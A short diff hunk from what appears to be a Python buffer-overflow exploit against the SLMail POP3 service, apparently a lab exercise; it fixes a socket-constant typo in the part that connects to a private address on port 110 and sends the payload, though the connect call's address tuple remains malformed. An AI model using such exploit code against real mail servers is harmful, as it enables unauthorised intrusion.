@@ -51,7 +51,7 @@ payload += buf
 #send exploit
 try:
     print("Connecting to SLMail...")
-    s = socket.socket(socket.AF_INET, socket.S0CK_STREAM)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("192.168.1.116"), 110)
     print("Receiving banner,,,")
     s.recv(1024)
